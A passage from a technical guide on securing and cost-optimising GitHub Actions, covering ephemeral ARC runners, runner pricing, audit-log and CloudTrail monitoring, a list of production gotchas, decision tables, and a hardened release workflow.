      serviceAccountName: arc-runner-sa
      containers:
        - name: runner
          image: ghcr.io/actions/actions-runner:2.330.0   # bump regularly
          resources:
            requests: { cpu: 2, memory: 4Gi }
            limits:   { cpu: 4, memory: 8Gi }
          env:
            - name: RUNNER_FEATURE_FLAG_ONCE
              value: "true"   # single-job enforcement
```

Key choices:

- **`githubConfigSecret`**: GitHub App, not PAT. Per-org installation, auto-rotating, scoped permissions.
- **`minRunners: 0`**: scale to zero when idle. Cost optimization + smaller attack surface.
- **`runnerGroup`**: isolate which repos can target this scale set. Critical for cost allocation and blast-radius isolation in a multi-team org.
- **Image version**: as of March 2026, runners older than v2.329.0 (Oct 2025) are blocked from registering. Keep `runner.image` rolling forward (Dependabot can be configured for container images too).

### JIT (Just-in-Time) registration tokens

Every ephemeral runner registers with a **single-use, short-lived token** the listener requests from GitHub's API right before spawning the pod. The token:

- **1-hour expiry** (configurable; default tight)
- **Single-use** -- invalid after the runner registers once
- **Job-scoped** -- only good for one specific job

This means even if a JIT token leaks via misconfigured logging, the blast radius is "one job that was about to run anyway." Compare to legacy PAT-based runner registration where a PAT could register arbitrary runners for hours.

### Runner groups -- per-team isolation

In an org with multiple teams sharing one ARC cluster, runner groups are the policy primitive:

```
Org Settings -> Actions -> Runner groups

  team-A-runners
    Repos: [team-A/app1, team-A/app2]
    Workflows: All
    Allow public repos: NO

  team-B-runners-with-gpu
    Repos: [team-B/ml-models]
    Workflows: ['training-*.yml']
    Allow public repos: NO

  shared-build-runners
    Repos: All private
    Workflows: All
    Allow public repos: NO
```

A workflow targets a runner group implicitly via the runner scale set's `runnerGroup` field. team-A's compromised PR cannot land on team-B's GPU runners (different group), so cross-team blast radius is bounded.

### Larger hosted runners -- the safer alternative in 2026

GitHub now offers larger hosted runners up to 64 cores. The 2026 pricing (post-Jan 2026 reduction):

| Runner | OS | Cores | $/minute (per-minute billing) |
|--------|-----|-------|--------------------------------|
| Standard | Linux x64 | 2 | $0.008 |
| Larger | Linux x64 | 4 | $0.012 |
| Larger | Linux x64 | 8 | $0.022 |
| Larger | Linux x64 | 16 | $0.042 |
| Larger | Linux x64 | 32 | $0.082 |
| Larger | Linux x64 | 64 | $0.162 |
| **Larger** | **Linux arm64** | **2** | **$0.005** |
| **Larger** | **Linux arm64** | **4** | **$0.008** |
| **Larger** | **Linux arm64** | **8** | **$0.014** |
| **Larger** | **Linux arm64** | **16** | **$0.026** |
| **Larger** | **Linux arm64** | **32** | **$0.050** |
| **Larger** | **Linux arm64** | **64** | **$0.098** |
| Larger | Windows x64 | 4 | $0.022 |
| Larger | Windows x64 | 8 | $0.042 |
| macOS (M2 Pro, 5-core arm64) | macOS | 5 | $0.102 |

The arm64/Graviton economics: **37% cheaper than equivalent x86 at every tier**. If your prod target is Graviton (very likely on AWS in 2026), running CI on arm64 catches platform-specific bugs at PR time AND saves 37%. Caveat: workflows that need x86-only binaries (proprietary security scanners, some commercial CLIs) need to stay on x86.

When self-hosted is still the right answer:
- **GPU workloads** (training, model build) -- hosted GPUs are rare and expensive
- **On-prem network access** -- the runner must be inside your VPC to reach internal services (private databases, internal artifact registries on private subnets)
- **Hardware secrets** -- the runner must access a hardware-backed key (YubiHSM, CloudHSM via IP allowlist)
- **Extreme volume** with cost-optimized spot/Karpenter (your hosted-runner bill exceeds the all-in cost of ARC on K8s)

For everything else in 2026, **larger hosted runners are cheaper than the engineering time required to harden a self-hosted setup**.

### The runner-as-lateral-movement-target threat

A self-hosted runner attached to a VPC inherits the VPC's reach. If the runner host has an instance profile that allows it to read SSM Parameter Store across the account, every workflow that lands on it can read SSM. The mitigation is:

1. **Minimal IAM on the runner host.** The runner's instance profile should grant *nothing* the runner doesn't need to function (logging, ECR pull for the runner image if K8s, period).
2. **Per-workflow IRSA.** Each workflow assumes its own role via OIDC (May 7). The runner host has no AWS permissions; each job's `aws-actions/configure-aws-credentials` step mints workload-specific creds for that job only.
3. **Ephemeral.** Even if a job is compromised, the runner pod dies at the end of the job. No persistence.

The composition: minimal host IAM + per-workload IRSA + ephemeral = blast radius capped at one job's specific permissions, not the runner host's ambient credentials.

---

## Part 8: Cost Optimization -- Security and Cost Are Linked

A workflow that wastes 80% of its compute is also a workflow that's hard to audit and easy to attack. Cost optimization in GHA is a security adjacent discipline, not a separate one.

### The Jan 2026 pricing reset

Per the Jan 1, 2026 changelog, GitHub-hosted runner per-minute meter prices dropped by **up to 39%**. The new pricing model bundles a flat **$0.002/min platform charge into the meter price itself** -- the per-minute prices in the table above are the post-reset, all-in numbers. There is no separate platform line item on your bill for these runners; everything is rolled into the per-minute rate.

Net effect for typical workloads (all-in math, no hidden fees):

- **5-min Linux 2-core x64 standard**: 5 min * $0.008 = $0.04 -- vs pre-reset ~$0.04 (the headline 39% reduction is concentrated on larger runners and arm64; the 2-core standard tier moved least).
- **30-min Linux 8-core x64 larger**: 30 min * $0.022 = $0.66 -- vs pre-reset ~$0.80 (~18% cheaper).
- **30-min Linux 8-core arm64 larger**: 30 min * $0.014 = $0.42 -- 36% cheaper than the x64 equivalent at the same tier, and ~30% cheaper than the same workload would have cost on x64 pre-reset.

The arm64 calculus is the strongest 2026 lever: not just the headline reset, but the structural ~36% Graviton discount at every tier. The combined "switch CI to arm64 and ride the Jan 2026 reset" move typically takes a workload from pre-reset x64 cost to ~50% of that. The pricing reset by itself, on x64, is a smaller win for small-runner workloads -- the savings concentrate on the larger-runner tiers where the platform charge represents a tiny fraction of the bundle.

### Cost-runaway gotchas (cross-ref May 5 concurrency)

The top 4 causes of unbounded GHA spend, in order:

1. **Matrix explosion.** A 4x4x4 matrix is 64 jobs; if any cell is on a 16-core runner, that's 64 * (build-time) * $0.042/min. Add `max-parallel: 4` to cap concurrent matrix cells and add `fail-fast: true` so a broken cell doesn't waste compute (gotcha from May 5).
2. **Cron storms.** A `schedule: cron: '*/5 * * * *'` on a workflow that takes 6 minutes runs continuously; you've effectively bought a 24/7 runner. Match cron frequency to actual change frequency.
3. **Missing `concurrency:` groups.** Push 10 commits to a feature branch in 10 minutes; without concurrency cancellation, 10 builds run in parallel and 9 of them produce artifacts nobody looks at. The May 5 pattern:

   ```yaml
   concurrency:
     group: ${{ github.workflow }}-${{ github.ref }}
     cancel-in-progress: ${{ github.event_name == 'pull_request' }}
   ```

4. **Workflows that re-run on every PR comment.** `on: issue_comment` triggers cheap, but if your workflow does a full `npm install + test`, you've turned PR discussion into compute spend. Use `paths-filter` (May 6) or `if:` guards on the job level.

### Visibility tools

```bash
# Programmatic: Actions usage API
gh api /repos/my-org/my-repo/actions/usage
gh api /enterprises/my-enterprise/settings/billing/usage

# UI: Settings -> Billing -> Plans and usage -> Actions
# Exports a CSV with per-workflow minutes-by-runner-type
```

Wire the API into a monitoring stack (Datadog, Grafana via JSON API) to alert on month-over-month cost spikes -- a runaway matrix or an infinite-loop workflow is a very expensive bug, and the audit log entry tells you exactly which commit introduced it.

The Pareto rule: **80% of your Actions spend is in two or three workflows.** Pull a 30-day usage report, sort by minutes descending, optimize the top 3. The remaining 80% of workflows don't need touching.

### When to use larger hosted vs ARC self-hosted vs spot

| Workload profile | Pick | Why |
|------------------|------|-----|
| CPU-bound build, <10 min, no special hardware | Larger hosted (Linux arm64 4-core) | $0.008/min, no infra, ephemeral by default |
| IO-bound test suite (npm install heavy) | Standard hosted (Linux x64 2-core) | Larger runners rarely cut wall time on IO-bound |
| GPU training, custom CUDA | ARC on K8s with GPU node pool + Karpenter | GitHub hosted GPU is limited; ARC + spot saves 70%+ |
| Build needs internal network (private artifacts) | ARC on K8s in your VPC | Hosted runners can't reach private subnets without NAT/VPN |
| 1000+ build minutes/day, generic CPU workload | ARC on K8s with Karpenter spot | At volume, ARC on spot is ~50% of larger-hosted prices |
| Compliance: builds must run in your account | ARC on K8s, audited cluster | Hosted runners are GitHub-owned infrastructure |

---

## Part 9: Workflow Observability and Audit

The vault's surveillance archive. Every meaningful event must be capturable, queryable, and exportable to a system you control.

### `GITHUB_STEP_SUMMARY` -- the deposit slip per shift

Per-job Markdown that renders on the run summary page:

```yaml
- name: Trivy scan with summary
  run: |
    trivy image --severity HIGH,CRITICAL --format json $IMAGE > scan.json
    CRIT=$(jq '[.Results[].Vulnerabilities[]? | select(.Severity=="CRITICAL")] | length' scan.json)
    HIGH=$(jq '[.Results[].Vulnerabilities[]? | select(.Severity=="HIGH")] | length' scan.json)
    cat <<EOF >> "$GITHUB_STEP_SUMMARY"
    ## Security Scan -- ${IMAGE}

    | Severity | Count |
    |----------|-------|
    | Critical | ${CRIT} |
    | High     | ${HIGH} |

    Detailed report: [download artifact](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})
    EOF

    if [ "$CRIT" -gt 0 ]; then exit 1; fi
```

Limit: 1 MiB per step. Renders on the workflow run page above the log -- a reviewer sees the deposit slip without expanding the wall of text. Use it for: scan results, deploy summaries, terraform plan diffs, Cosign certificate identities, attestation subjects.

### Annotation workflow commands

```bash
# Inline file/line annotations -- render in the PR Files Changed tab
echo "::notice file=src/auth.py,line=42::Consider rotating this token"
echo "::warning file=requirements.txt,line=17::numpy 1.23.0 has known CVE-2024-12345"
echo "::error file=Dockerfile,line=8::Base image uses ENTRYPOINT shell form -- prefer exec form"

# Add a runtime string to log redaction
echo "::add-mask::$DERIVED_TOKEN"
```

Critical use: a security scanner that finds a CVE in `requirements.txt` line 17 can emit a `::error::` and the PR reviewer sees the annotation right next to the offending line. 10x better UX than "go read the log on attempt 3 of the scan job."

### The GitHub audit log -- the master surveillance archive

What lands in the audit log (Settings -> Audit log, or `gh api /enterprises/{enterprise}/audit-log`):

- **Workflow runs**: every `actions.run_workflow_run` event with workflow name, repo, actor, ref
- **Environment approvals**: `environment.approval_granted` / `environment.approval_rejected` with reviewer and timestamp
- **Secret access events**: when secrets are read by a workflow (Enterprise tier)
- **OIDC token issuance**: every `actions.run_workflow_run` includes the `sub` claim that was minted
- **Branch protection bypass**: every time a bypass actor merges without checks passing
- **Ruleset changes**: every modification to ruleset config with old/new values
- **Self-hosted runner registration**: every runner registration event with token ID

Retention: **180 days free, longer with Enterprise**. The retention gap is the production-critical issue -- a breach detected on day 200 is invisible. Export to your SIEM:

```yaml
# Schedule: nightly audit log export to S3
- name: Export audit log to S3
  env:
    GH_TOKEN: ${{ steps.app-token.outputs.token }}
  run: |
    gh api /enterprises/my-enterprise/audit-log \
      --paginate \
      -X GET -F per_page=100 \
      -F phrase="created:>${YESTERDAY}" \
      > audit-${TODAY}.json
    aws s3 cp audit-${TODAY}.json s3://my-org-audit-archive/github-actions/year=${YEAR}/month=${MONTH}/
```

Query in Athena with a 2+ year retention. The breach-disclosure clock starts when you *should have detected* the breach; if your audit log expired before you queried it, you've lost the ability to prove compliance.

### CloudTrail correlation -- the AWS side of the OIDC swipe

Every `AssumeRoleWithWebIdentity` call from GitHub Actions appears in CloudTrail. **CRITICAL: the raw JWT is NOT in `requestParameters.webIdentityToken`** -- CloudTrail elides it as `***` (sensitive credential redaction). The decoded claims land in `userIdentity.webIdFederationData`, which is what you query against:

```sql
-- Athena: every GitHub workflow that assumed any role in the last 24h.
-- The OIDC sub + repo + workflow_ref claims are pre-decoded by CloudTrail
-- into userIdentity.webIdFederationData.attributes (a map<string,string>).
SELECT
  eventTime,
  userIdentity.webIdFederationData.identityProvider AS oidc_issuer,
  userIdentity.webIdFederationData.attributes['sub']           AS sub_claim,
  userIdentity.webIdFederationData.attributes['repository']    AS repository,
  userIdentity.webIdFederationData.attributes['workflow_ref']  AS workflow_ref,
  userIdentity.webIdFederationData.attributes['run_id']        AS run_id,
  userIdentity.webIdFederationData.attributes['environment']   AS environment,
  requestParameters.roleArn,
  requestParameters.roleSessionName,
  sourceIPAddress
FROM cloudtrail_logs
WHERE eventName = 'AssumeRoleWithWebIdentity'
  AND eventSource = 'sts.amazonaws.com'
  AND userIdentity.webIdFederationData.identityProvider
        = 'token.actions.githubusercontent.com'
  AND from_iso8601_timestamp(eventTime) > current_timestamp - interval '1' day;
```

Two gotchas. **First**: not every CloudTrail schema exposes the `attributes` map; some account/Lake configurations leave only `identityProvider` populated. If the `attributes` column is empty in your schema, you must enable CloudTrail's enhanced WebIdentity logging (or query Lake's `userIdentity.sessionContext.sessionIssuer` view depending on your setup). **Second**: predicates that look for the OIDC issuer string in `requestParameters.webIdentityToken` (the raw JWT) will return zero rows -- the token is redacted before logging. Always join on `userIdentity.webIdFederationData.identityProvider`.

This query is the "who got AWS creds from GitHub yesterday?" foundation. Pair with audit-log export, and you have **both sides of the OIDC handshake** in one queryable system: GitHub side says "this workflow ran"; AWS side says "this workflow assumed this role at this time with this sub claim, from this source IP." A discrepancy (AWS sees an assumption that GitHub doesn't show, or a `sub` from a workflow_ref that doesn't exist in the GitHub audit log) means token replay or token theft -- detectable, not just preventable.

### Shadow-assume synthetic monitor -- catching OIDC drift in non-prod hours

The April 23 2026 immutable subject claims rollout taught the industry a lesson: **platform-side changes can break your auth in production at 02:00 UTC with no code change on your side.** The defense is a synthetic monitor that exercises the real OIDC trust path daily and pages on failure -- turning silent platform-side drift into a tracked alert hours before the first real deploy of the day.

```yaml
# .github/workflows/shadow-assume.yml -- runs daily, no deploys, no side effects
name: Shadow OIDC Assume
on:
  schedule:
    - cron: '0 5 * * *'   # 05:00 UTC -- before any business-hours deploys
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  verify-prod-trust:
    runs-on: ubuntu-22.04-arm
    environment: production    # exercises the real reviewer-gated, env-scoped sub
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: ${{ vars.PROD_DEPLOY_ROLE_ARN }}
          aws-region: us-east-1

      - name: Verify identity and exit
        run: |
          ID=$(aws sts get-caller-identity --query Arn --output text)
          echo "Assumed: $ID"
          # No actual deploys -- just prove the OIDC handshake works.
          # If we got here, sub-claim matched trust policy and role is valid.

  verify-stg-trust:
    runs-on: ubuntu-22.04-arm
    environment: staging
    steps:
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: ${{ vars.STG_DEPLOY_ROLE_ARN }}
          aws-region: us-east-1
      - run: aws sts get-caller-identity
```

Wire it to PagerDuty (or Slack with @here for non-critical) on workflow failure via the audit-log export. The first time it fires, the alert reads: "Shadow-Assume failed at 05:00 UTC for prod-deploy-role." That's the alert that turns a future Tuesday-morning fire into a Friday-evening Slack ping with a full day of business hours to remediate.

What this catches that nothing else does:
- **OIDC sub-format changes** (the April 23 2026 case study)
- **Trust policy drift** -- someone updated the policy and broke an unused-during-business-hours role
- **OIDC provider thumbprint rotation** -- AWS validates the GitHub IdP certificate; certificate rotation that breaks your IdP config fires here
- **AssumeRole expiration / removal** -- a role that was rotated/deleted in IAM without updating the GHA `vars` reference
- **Region-specific issues** -- if your prod role is in `us-east-1` and AWS has an STS regional issue, the synthetic catches it for you before customers do

The pattern generalizes beyond AWS. The same workflow shape can synthetic-exercise GCP Workload Identity Federation, Vault OIDC auth, Datadog OIDC, npm publish OIDC -- anywhere your CI/CD relies on platform-side OIDC token validation.

### Actions usage metrics API -- runtime + cost SLOs on the CI/CD itself

```bash
# Per-repo usage
gh api /repos/my-org/my-repo/actions/usage

# Per-workflow billing
gh api /repos/my-org/my-repo/actions/workflows/release.yml/timing

# Enterprise-wide
gh api /enterprises/my-enterprise/settings/billing/usage
```

Wire into Grafana (April 24 doc). SLO targets to consider:

- **PR-CI p95 wall time < 10 min** (developer feedback SLO)
- **Release pipeline p95 < 30 min** (release-velocity SLO)
- **Cost per merged PR < $X** (efficiency SLO; spike alerts catch matrix explosions)
- **OIDC assumption success rate > 99.9%** (security path availability)

The CI/CD pipeline itself is a production system. It deserves SLOs.

---

## Part 10: The 2026 Security Roadmap -- What's Coming

GitHub's Jan 2026 roadmap post laid out five major shifts. Worth knowing because today's hardening patterns are *transitional* -- the structural fixes are coming.

| Feature | What it fixes | Today's workaround | Public preview |
|---------|---------------|--------------------|----------------|
| **Workflow `dependencies:` lockfile** | Transitive action pinning (the reviewdog gap in tj-actions) | `pinact run --check` + fork+vendor critical actions | 3-6 months |
| **Immutable releases** | Vendor-side enforcement; tag CANNOT be force-moved | SHA pin every action; treat tags as advisory | 6-9 months |
| **Policy-driven execution** | Built on Rulesets; controls who can trigger workflows and which events | Branch ruleset + CODEOWNERS + bypass actor audit | 3-6 months |
| **Scoped secrets (default)** | `inherit` deprecation; explicit `secrets:` allowlist becomes default | Always use explicit secret mapping, never `inherit` | 3-6 months |
| **Actions Data Stream** | Real-time execution telemetry to S3 + Azure Event Hub | Audit log export + CloudTrail correlation | 3-6 months |
| **Native egress firewall** | L7 firewall on hosted runners with domain/IP allowlists | StepSecurity Harden-Runner action (eBPF egress) | 6-9 months |

Read this as: every hardening pattern today is good practice now AND a structural upgrade is coming. Don't wait for the platform; harden today with the workarounds, migrate to the platform features as they GA.

---

## Part 11: Production Gotchas (21 items)

1. **`pull_request_target` + checkout of fork SHA = pwn-request.** The `pull_request_target` trigger runs in the context of the base repo with read/write `GITHUB_TOKEN` and access to secrets. Checking out the fork's HEAD SHA executes attacker code with prod credentials. (Cross-ref May 5/7.) Use plain `pull_request` for PR CI; reserve `pull_request_target` for label-bots only.
2. **SemVer tag pinning is mutable.** `@v4.1.1` can be force-pushed to a different commit. Only `@<40-char-SHA>` is immutable. Tags are stickers; SHAs are contents.
3. **`secrets: inherit` cross-org is silently empty.** A reusable workflow called from a different org gets no secrets, no error, no warning. Use explicit `secrets: { NAME: ${{ secrets.NAME }} }` mapping. (Cross-ref May 5.)
4. **Required status check + path-filtered job = PR permanently blocked.** A skipped job is not a successful one. Fix with the status-aggregator-job pattern (`if: always()` + per-needs result check). (Cross-ref May 6.)
5. **Self-hosted runner on a public repo = arbitrary code execution on your network.** A fork PR runs attacker code with the runner's ambient credentials. No mitigation works; do not do this.
6. **Persistent (non-ephemeral) runner = persistent compromise surface.** Once any job is compromised on a non-ephemeral runner, every subsequent job runs alongside attacker code. Always `--ephemeral`.
7. **`core.setSecret()` and `::add-mask::` are log redaction, not data-leak prevention.** They redact exact-string matches in logs; they do not prevent the value from being sent over HTTP, written to artifacts, or printed in pieces.
8. **GitHub App private key in repo secret is the new long-lived credential.** OIDC eliminates stored AWS keys, but if you use a GitHub App for cross-repo writes, the App's private key is now your highest-value long-lived secret. Rotate annually; store in environment-scoped secret only.
9. **Reusable workflow nesting depth is capped at 4; exceeding it fails the run with an explicit error.** GitHub limits reusable-workflow nesting to 4 levels. At depth 5, the workflow run fails with a "reusable workflow exceeded the maximum nesting depth" error -- not silent truncation, but the wrong defensive code (try/catch wrappers, conditional gates) wastes hours. Flatten or refactor into composite actions (which have a separate 9-deep limit, May 6). (Cross-ref May 5/6.)
10. **Ruleset bypass actor in "Always" mode = backdoor.** "Always" lets the actor commit directly to main with no PR. Use "Pull request only" so even bypass actors leave an audit trail.
11. **CODEOWNERS without "require pull request reviews from CODEOWNERS" is advisory only.** It suggests reviewers but doesn't enforce. Pair with a Ruleset rule to actually enforce.
12. **Dependabot PRs that auto-merge without status checks = supply-chain risk re-introduced.** Automerging Dependabot bypasses your review; an attacker who pushes a malicious release tag during your cooldown window can sneak in. Either require manual review on Dependabot PRs OR add a comprehensive test+scan check that runs on every Dependabot PR before auto-merge.
13. **arm64 runners are NOT the default.** Workflows must explicitly opt in via `runs-on: ubuntu-22.04-arm` (or similar arm64 label). A workflow that builds for arm64 prod but runs CI on x64 hosted-default catches platform bugs only in prod.
14. **`GITHUB_TOKEN` default permissions vary by repo age.** Legacy repos default to read-write on `GITHUB_TOKEN`; repos created after a certain GitHub config rollout default to read-only. Always declare `permissions:` at the top of every workflow explicitly; never rely on the default.
15. **JIT runner registration tokens have 1-hour expiry.** Automation that mints tokens must refresh; long-lived test setups fail mysteriously after an hour.
16. **Branch protection bypass for apps grants permanent privileged access.** If a bypass actor list includes a GitHub App that someone forgot to revoke, that App can merge to main without checks forever. Audit the bypass actor list quarterly.
17. **Verified Creator badge does not mean SHA-pinning is optional, and most popular community actions don't have the badge anyway.** The badge is reserved for Technology Partner orgs (AWS, Docker, HashiCorp, etc.) and confirms publisher identity, not immunity to credential theft. `tj-actions` was an individual maintainer with no Verified Creator badge -- the badge would have made no difference. Always SHA-pin.
18. **Audit log retention is 180 days free, often shorter than your breach-disclosure window.** Export to your own SIEM with 2+ year retention before you need it.
19. **`paths-filter` on the trigger doesn't prevent jobs from running -- only `paths` does.** Many engineers use `dorny/paths-filter` inside a job to set outputs, but the job still runs to evaluate the filter. To actually skip the workflow, use `paths:` / `paths-ignore:` on the trigger itself. (Cross-ref May 6.)
20. **Environment-scoped secret on a job without `environment:` is silently empty.** No error, just empty string. Always pair env-scoped secrets with `environment:` on the consuming job. (Cross-ref May 10.)
21. **April 23 2026 immutable subject claim opt-in silently breaks old trust policies.** The new `sub` format (`repo:my-org-{ID}/my-repo-{ID}:...`) does not match policies anchored to the old `repo:my-org/my-repo:...` string. When a repo opts in (default for new/transferred repos June 18, 2026), every downstream OIDC trust policy must accept BOTH formats during the transition or AssumeRoleWithWebIdentity will silently `AccessDenied`.

---

## Part 12: Decision Frameworks

### Framework 1 -- Hosted vs self-hosted runner

| Factor | Hosted | Larger hosted | ARC self-hosted | Conclusion |
|--------|--------|---------------|-----------------|------------|
| Cost (10 min/day CPU build) | $0.08/day | $0.12/day | $0.10/day (with K8s overhead) | Hosted wins |
| Cost (1000 min/day generic) | $8/day | $12/day | $4/day (spot) | ARC wins at volume |
| Security on public repos | Safe | Safe | NEVER | Hosted only |
| Internal network access | No | No | Yes (VPC) | ARC required |
| GPU workloads | Limited | Limited | Yes | ARC required |
| Compliance: builds in your account | No | No | Yes | ARC required |
| Setup + maintenance overhead | Zero | Zero | Real | Hosted unless you have a platform team |

**Default: hosted unless you have a specific reason. ARC requires a platform team to operate; if you don't have one, larger hosted runners are usually cheaper than the engineering time.**

### Framework 2 -- Repo vs environment vs organization secret

| Factor | Repo secret | Environment secret | Org secret |
|--------|-------------|--------------------|------------|
| Blast radius if leaked | All workflows in 1 repo | Only env-gated jobs in 1 env | Every repo with org access |
| Protection rule gating | No | Yes (required reviewers, wait timer) | No |
| Best for | Service-specific, no env split | Prod-bearing creds | SaaS keys shared org-wide |
| Rotation cadence | 90 days static / per-use OIDC | 90 days static / per-use OIDC | 90 days static; expensive coordination |
| Decision | Default | Prod-bearing -- always | Only when truly shared by many repos |

**Default: environment for anything prod-bearing; repo for everything else; org only for truly cross-cutting SaaS creds.**

### Framework 3 -- Rulesets vs classic branch protection

| Factor | Rulesets | Classic |
|--------|----------|---------|
| New repos (2026+) | Default | Legacy |
| Multi-rule composition | Yes | No |
| Tag protection | Yes | No |
| Smart status-check matching | Yes (by integration) | No (exact string) |
| Org-level enforcement | Yes | No |
| GitHub roadmap investment | Active | Maintenance mode |

**Use Rulesets always. The only case for classic is a legacy repo on a deprecated GitHub Enterprise Server version that hasn't shipped Rulesets yet -- and the right answer there is to upgrade GHES.**

### Framework 4 -- GitHub-native attestation vs Cosign signing

| Question | Use Cosign | Use Attestations | Use both |
|----------|-----------|------------------|----------|
| Just need "these bytes are signed by my CI"? | Yes | Yes | Overkill |
| Need full SLSA provenance (workflow, branch, commit)? | No | Yes | Yes |
| Need OCI-native discovery (registries, scanners)? | Yes | Optional | Yes |
| Need GitHub UI / `gh attestation list` visibility? | No | Yes | Yes |
| Production posture | Common | Newer | **Default in 2026** |

**Default: both, signed by the same OIDC identity. Cosign for OCI-native verification (Kyverno, Sigstore policy-controller); attestations for the SLSA provenance + GitHub UI integration. The two cost almost nothing extra in build time.**

### Framework 5 -- Dependabot vs pinact/ratchet for action pinning

| Factor | Dependabot | pinact/ratchet |
|--------|-----------|----------------|
| Trigger | GitHub-hosted, automatic | Local + CI check |
| Granularity | Per-action, per-update | Bulk one-shot |
| Workflow | PR-based, reviewable | Commit-based |
| Update cadence | Continuous (weekly) | On-demand (`pinact run`) |
| Cooldown / soak | Yes (`cooldown:` setting) | No (you control timing) |
| Best for | Ongoing maintenance | Initial conversion + drift detection in CI |
| **Use** | **Always; the standing process** | **Always; the conversion + CI guardrail** |

**Use both. Dependabot for ongoing weekly updates; pinact (`run --check`) in CI to prevent any PR from introducing a tag-form reference.**

### Framework 6 -- Larger hosted vs ARC for high-volume CI

| Daily build minutes | Larger hosted (Linux 8-core x64) | ARC on K8s (spot, 8-core) | Pick |
|---------------------|----------------------------------|---------------------------|------|
| <500 min/day | $11/day | $5/day + ~$3/day K8s overhead | Hosted (less ops) |
| 500-2000 min/day | $11-44/day | $8-20/day | ARC if you have a platform team |
| 2000-10,000 min/day | $44-220/day | $20-100/day | ARC clearly |
| 10,000+ min/day | $220+/day | $100+/day | ARC with reserved instances |

**Break-even is around 2000-3000 min/day. Below that, larger hosted; above, ARC with spot/Karpenter.**

---

## Part 13: A Full Production-Hardened `release.yml`

This is what every pattern from May 5 / May 6 / May 7 / May 10 / today looks like composed into a single workflow.

```yaml
# .github/workflows/release.yml
name: Release

on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      target_environment:
        description: 'Target environment for manual release'
        required: true
        type: choice
        options: [dev, stg, prod]

# Default to read-only at workflow level -- jobs opt in to more
permissions:
  contents: read

# Cancel in-progress PR builds; serialize main builds (May 5)
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  AWS_REGION: us-east-1
  IMAGE_REPO: 123456789012.dkr.ecr.us-east-1.amazonaws.com/myapp

jobs:
  # === Job 1: PR-side dependency review (only on PRs) ===
  dependency-review:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-22.04-arm   # arm64: 37% cheaper
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.1
      - uses: actions/dependency-review-action@5a2ce3f5b92313e4045dd0d4a9eaa0e9d5e23d18 # v4.5.0
        with:
          fail-on-severity: high
          comment-summary-in-pr: on-failure

  # === Job 2: Build, scan, sign, attest, push (the May 7 stack hardened) ===
  build-and-sign:
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-22.04-arm
    permissions:
      id-token: write          # OIDC to AWS for ECR + Sigstore
      contents: read           # checkout
      packages: write           # ECR push
      attestations: write       # GitHub-native attestations
    outputs:
      digest: ${{ steps.build.outputs.digest }}
    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.1

      - uses: docker/setup-qemu-action@49b3bc8e6bdd4a60e6116a5414239cba5943d3cf # v3.2.0
      - uses: docker/setup-buildx-action@988b5a0280414f521da01fcc63a27aeeb4b104db # v3.6.1

      # OIDC -- environment-scoped sub (May 10) for prod; branch-scoped for build
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GHA-MyApp-BuildRole
          aws-region: ${{ env.AWS_REGION }}
          role-session-name: GHA-build-${{ github.run_id }}-${{ github.run_attempt }}

      - id: ecr-login
        uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076 # v2.0.1

      - id: meta
        uses: docker/metadata-action@8e5442c4ef9f78752691e2d8f8d19755c6f78e81 # v5.5.1
        with:
          images: ${{ env.IMAGE_REPO }}
          tags: |
            type=sha,format=long
            type=ref,event=branch
            type=raw,value=latest,enable={{is_default_branch}}

      - id: build
        uses: docker/build-push-action@5176d81f87c23d6fc96624dfdbcd9f3830bbe445 # v6.5.0
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha,scope=myapp
          cache-to: type=gha,mode=max,scope=myapp
          provenance: mode=max     # BuildKit provenance attestation
          sbom: true                # BuildKit SBOM attestation

      - name: Trivy scan with fail-on-CVE
        uses: aquasecurity/trivy-action@18f2510ee396bbf400402947b394f2dd8c87dbb0 # v0.27.0
        with:
          image-ref: ${{ env.IMAGE_REPO }}@${{ steps.build.outputs.digest }}
          severity: HIGH,CRITICAL
          exit-code: 1
          format: sarif
          output: trivy.sarif

      - uses: github/codeql-action/upload-sarif@4ff8caee5fb33c70b08bb74dabf6f70f74a3a4d2 # v3.27.0
        if: always()
        with:
          sarif_file: trivy.sarif

      # Cosign keyless signing (May 7) -- "wax seal on the bytes"
      - uses: sigstore/cosign-installer@4959ce089c2fe283b1beed9b2b683f9b54fd77ba # v3.6.0
      - name: Cosign sign by digest
        env:
          IMG: ${{ env.IMAGE_REPO }}@${{ steps.build.outputs.digest }}
        run: cosign sign --yes "$IMG"

      # GitHub-native attestation -- "notarized provenance" (v4 wraps actions/attest)
      - uses: actions/attest-build-provenance@7668571508540a607bdfd90a87a560489fe372eb # v4.0.0
        with:
          subject-name: ${{ env.IMAGE_REPO }}
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true

      # Job summary -- human-readable release receipt
      - name: Write release summary
        run: |
          cat <<EOF >> "$GITHUB_STEP_SUMMARY"
          ## Release Build Summary

          | Field | Value |
          |-------|-------|
          | Image | \`${{ env.IMAGE_REPO }}\` |
          | Digest | \`${{ steps.build.outputs.digest }}\` |
          | Commit | \`${{ github.sha }}\` |
          | Workflow ref | \`${{ github.ref }}\` |
          | Cosign-verifiable identity | \`https://github.com/\${{ github.repository }}/.github/workflows/release.yml@${{ github.ref }}\` |
          | Attestation | [\`gh attestation list ${{ env.IMAGE_REPO }}\`](https://github.com/${{ github.repository }}/attestations) |

          Verify locally:
          \`\`\`
